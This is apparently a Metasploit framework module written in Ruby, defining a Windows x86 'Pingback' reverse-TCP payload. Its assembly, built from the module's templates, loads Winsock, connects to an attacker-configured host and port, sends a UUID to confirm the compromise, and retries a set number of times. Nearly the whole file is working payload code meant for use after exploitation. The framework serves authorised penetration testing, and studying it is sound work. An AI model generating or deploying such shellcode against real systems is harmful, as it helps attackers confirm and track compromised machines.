##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/block_api'
require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
module MetasploitModule

  CachedSize = 324

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Windows::BlockApi
  include Msf::Sessions::PingbackOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x86 Pingback, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and report UUID (Windows x86)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Pingback
      ))

    def generate_stage
      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
      retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
      pingback_count = datastore['PingbackRetries']
      pingback_sleep = datastore['PingbackSleep']
      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      pingback_uuid ||= generate_pingback_uuid
      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
      addr_fam      = 2
      sockaddr_size = 16

      asm = %Q^
        cld                    ; Clear the direction flag.
        call start             ; Call start, this pushes the address of 'api_call' onto the stack.
        #{asm_block_api}
        start:
          pop ebp
        ; Input: EBP must be the address of 'api_call'.
        ; Output: EDI will be the socket for the connection to the server
        ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
        reverse_tcp:
          push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
          push 'ws2_'             ; ...
          push esp                ; Push a pointer to the "ws2_32" string on the stack.
          push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
          mov eax, ebp
          call eax                ; LoadLibraryA( "ws2_32" )

          mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
          sub esp, eax            ; alloc some space for the WSAData structure
          push esp                ; push a pointer to this stuct
          push eax                ; push the wVersionRequested parameter
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
          call ebp                ; WSAStartup( 0x0190, &WSAData );

        set_address:
          push #{pingback_count}     ; retry counter
          push #{retry_count}     ; retry counter
          push #{encoded_host}    ; host in little-endian format
          push #{encoded_port}    ; family AF_INET and port number
          mov esi, esp            ; save pointer to sockaddr struct

        create_socket:
          push eax                ; if we succeed, eax will be zero, push zero for the flags param.
          push eax                ; push null for reserved parameter
          push eax                ; we do not specify a WSAPROTOCOL_INFO structure
          push eax                ; we do not specify a protocol
          inc eax                 ;
          push eax                ; push SOCK_STREAM
          inc eax                 ;
          push eax                ; push AF_INET
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
          call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
          xchg edi, eax           ; save the socket for later, don't care about the value of eax after this

        try_connect:
          push 16                 ; length of the sockaddr struct
          push esi                ; pointer to the sockaddr struct
          push edi                ; the socket
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
          call ebp                ; connect( s, &sockaddr, 16 );

          test eax,eax            ; non-zero means a failure
          jz connected

        handle_connect_failure:
          ; decrement our attempt count and try again
          dec dword [esi+8]
          jnz try_connect
        failure:
          call exitfunk
          ; this  lable is required so that reconnect attempts include
          ; the UUID stuff if required.
        connected:
        send_pingback:
          push 0                 ; flags
          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
          call get_pingback_address  ; put pingback_uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID
        get_pingback_address:
          push edi               ; saved socket
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
          call ebp               ; call send

        cleanup_socket:
          ; clear up the socket
          push edi                ; socket handle
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
          call ebp                ; closesocket(socket)
        ^
        if pingback_count > 0
          asm << %Q^
            mov eax, [esi+12]
            test eax, eax               ; pingback counter
            jz exitfunk
            dec [esi+12]
            sleep:
              push #{(pingback_sleep*1000).to_s}
              push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
              call ebp                  ;sleep(pingback_sleep*1000)
              jmp create_socket
          ^
        end
        asm << %Q^
          ; restore the stack back to the connection retry count
          pop esi
          pop esi
          dec [esi+8]               ; decrement the retry counter
          jmp exitfunk
          ; try again
          jnz create_socket
          jmp failure
        exitfunk:
          mov ebx, 0x56a2b5f0
          push.i8 0              ; push the exit function parameter
          push ebx               ; push the hash of the exit function
          call ebp               ; ExitProcess(0)
      ^
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    end
  end
end
